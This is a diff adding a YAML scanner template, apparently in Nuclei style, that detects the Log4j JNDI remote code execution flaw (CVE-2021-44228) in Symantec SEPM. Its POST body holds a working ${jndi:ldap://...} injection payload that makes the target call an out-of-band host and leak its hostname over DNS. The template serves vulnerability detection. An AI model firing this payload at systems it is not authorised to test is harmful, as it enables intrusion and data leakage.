@@ -1,0 +1,34 @@
+id: symantec-sepm-log4j-rce
+brief:
+    title: Symantec SEPM - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Symantec SPEM is susceptible to Log4j JNDI remote code execution.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - symantec
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/console/apps/sepm'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: cookieTest=true;
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/console/apps/sepm'
+        X-Requested-With: XMLHttpRequest
+      body: actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&__Action=v4&__FastSubmit=true
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
